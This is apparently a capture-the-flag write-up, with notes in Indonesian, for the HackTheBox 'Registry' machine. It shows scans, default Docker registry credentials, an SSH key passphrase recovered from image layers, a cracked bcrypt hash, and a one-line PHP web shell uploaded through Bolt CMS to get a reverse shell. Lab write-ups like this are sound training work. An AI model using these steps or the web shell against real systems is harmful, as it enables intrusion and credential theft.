
| PORT | STATE | SERVICE | VERSION                               |
|------|-------|---------|---------------------------------------|
| 22/tcp  | open  | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3       |
| 80/tcp  | open  | http    | nginx 1.14.0 (Ubuntu)                 |
| 443/tcp | open  | ssl/http| nginx 1.14.0 (Ubuntu)                 |

### Service Details:

**SSH:**
- Port: 22/tcp
- Version: OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
- SSH Host Keys:
  - RSA: 2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93
  - ECDSA: 256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d
  - ED25519: 256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93

**HTTP:**
- Port: 80/tcp
- Service: nginx 1.14.0 (Ubuntu)
- HTTP Server Header: nginx/1.14.0 (Ubuntu)
- HTTP Title: Welcome to nginx!

**HTTPS:**
- Port: 443/tcp
- Service: nginx 1.14.0 (Ubuntu)
- SSL Certificate:
  - Subject: commonName=docker.registry.htb
  - Validity: Not valid before 2019-05-06, Not valid after 2029-05-03
- HTTP Server Header: nginx/1.14.0 (Ubuntu)
- HTTP Title: Welcome to nginx!

### Additional Information:
- OS: Linux
- CPE: cpe:/o:linux:linux_kernel


# Docker register

di sini kita tau bahwa port 443 ada docker.register.htb
dan juga harus login dengan password dan username admin:admin di sini saya gak percaya default credentsial nya admin:admin wkwkwk


# ffuf Scan Results

#### Scan Details:
- **Method**: GET
- **URL**: [http://10.10.10.159/FUZZ](http://10.10.10.159/FUZZ)
- **Wordlist**: `/home/aexon/tools/wordlist/medium`
- **Extensions**: `.php`, `.txt`, `.log`
- **Follow redirects**: false
- **Calibration**: false
- **Timeout**: 10 seconds10.10.10.159
- **Threads**: 40
- **Matcher**: Response status: 200-299,301,302,307,401,403,405,500

#### Scan Results:

| Path         | Status | Size | Words | Lines | Duration |
|--------------|--------|------|-------|-------|----------|
| /install     | 301    | 194  | 7     | 8     | 541ms    |
| /bolt        | 301    | 194  | 7     | 8     | 107ms    |
| /            | 200    | 612  | 79    | 26    | 114ms    |

#### Scan Details:
- **Method**: GET
- **URL**: [http://registry.htb/bolt/FUZZ](http://registry.htb/bolt/FUZZ)
- **Wordlist**: `/home/aexon/tools/wordlist/medium`
- **Extensions**: `.txt`, `.php`, `.log`
- **Follow redirects**: false
- **Calibration**: false
- **Timeout**: 10 seconds
- **Threads**: 40
- **Matcher**: Response status: 200-299,301,302,307,401,403,405,500

#### Scan Results:

| Path         | Status | Size | Words | Lines | Duration |
|--------------|--------|------|-------|-------|----------|
| /index.php   | 200    | 8237 | 2934  | 218   | 314ms    |
| /files       | 301    | 194  | 7     | 8     | 133ms    |
| /tests       | 301    | 194  | 7     | 8     | 158ms    |
| /src         | 301    | 194  | 7     | 8     | 159ms    |
| /app         | 301    | 194  | 7     | 8     | 922ms    |
| /theme       | 301    | 194  | 7     | 8     | 199ms    |
| /vendor      | 301    | 194  | 7     | 8     | 714ms    |
| /extensions  | 301    | 194  | 7     | 8     | 134ms    |


# User exploit


di sini saya mendapatkan sebuat password pada folder ke 4

```bash
(DockerRegistryGrabber) ┌─[aexon@parrot]─[~/tools/enum/DockerRegistryGrabber/bolt-image/4/etc/profile.d]
└──╼ $cat 01-ssh.sh 
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

saya juga mendapatkan info beberapa user
	1. registry
	2. bolt

dan saya juga mendapatkan file id_rsa di folder nomer 2 /root/.ssh

```bash
(DockerRegistryGrabber) ┌─[✗]─[aexon@parrot]─[~/tools/enum/DockerRegistryGrabber/bolt-image/2/root/.ssh]
└──╼ $ssh -i id_rsa bolt@10.10.10.159
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Mon Jun 24 14:40:41 UTC 2024

  System load:  0.01              Users logged in:                0
  Usage of /:   68.7% of 4.71GB   IP address for eth0:            10.10.10.159
  Memory usage: 27%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    169
Last login: Mon Oct 21 10:31:48 2019 from 10.10.14.2
bolt@registry:~$ ls -al
total 28
drwx------ 6 bolt bolt 4096 Apr  6  2021 .
drwxr-xr-x 3 root root 4096 Apr  6  2021 ..
lrwxrwxrwx 1 bolt bolt    9 May 26  2019 .bash_history -> /dev/null
drwx------ 3 bolt bolt 4096 Apr  6  2021 .cache
drwx------ 3 bolt bolt 4096 Apr  6  2021 .gnupg
drwxrwxr-x 3 bolt bolt 4096 Apr  6  2021 .local
drwx------ 2 bolt bolt 4096 Apr  6  2021 .ssh
-r-------- 1 bolt bolt   33 Jun 24 13:14 user.txt
bolt@registry:~$ 

passowrd: GkOcz221Ftb3ugog
```



# ROOT

saya menemukan db dan credentsial di db nya



```bash
cat /var/www/html/bolt/app/database/bolt.db

admin$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
```


```bash
┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/linux/Registry]
└──╼ $sudo john --wordlist=/root/rockyou.txt password.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
strawberry       (?)     
1g 0:00:00:03 DONE (2024-06-24 22:17) 0.2816g/s 101.4p/s 101.4c/s 101.4C/s strawberry..brianna
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/linux/Registry]
└──╼ $

```


1. login ke bolt nya dan ubah configuration main nya tambahin pakai php
2. upload shell ke upload file dengan code :
   ```php
   <?php system($_REQUEST['cmd']); ?>
```
3. nyalakan reverse shell dengan ip localhost dan reverse shell di ssh nya langsung
4. ![[Screenshot at 2024-06-24 23-42-06.png]]
	